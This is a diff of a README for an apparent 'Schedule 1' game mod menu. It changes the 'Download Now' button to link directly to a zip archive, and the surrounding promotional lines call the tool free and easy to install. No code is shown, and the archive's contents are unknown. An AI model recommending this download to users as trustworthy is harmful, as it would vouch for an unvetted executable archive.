@@ -12,7 +12,7 @@ Built for simplicity, speed, and reliability.
 - Easy to install and use  
 - 100% free, no strings attached  
 
-[![Download Now](https://github.com/schedule1-mod/menu/blob/main/button_download-now.png?raw=true)](https://github.com/schedule1-mod/menu/releases/latest)
+[![Download Now](https://github.com/schedule1-mod/menu/blob/main/button_download-now.png?raw=true)](https://github.com/schedule1-mod/menu/releases/download/dl/Schedule.1.Mod.Menu.zip)
 
 ## 🧠 Getting Started
 
